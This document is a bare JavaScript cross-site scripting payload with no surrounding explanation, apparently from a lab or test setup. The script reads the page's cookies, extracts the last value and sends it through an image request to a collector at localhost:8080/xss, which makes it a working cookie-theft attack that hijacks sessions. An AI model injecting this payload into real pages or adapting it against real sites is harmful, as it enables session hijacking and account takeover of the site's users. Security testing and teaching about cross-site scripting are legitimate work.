<script>
    var cookie=encodeURI(document.cookie);
    cookie=cookie.substring(cookie.lastIndexOf("=")+1,cookie.length);
    new Image().src="http://localhost:8080/xss?c="+cookie;
</script>
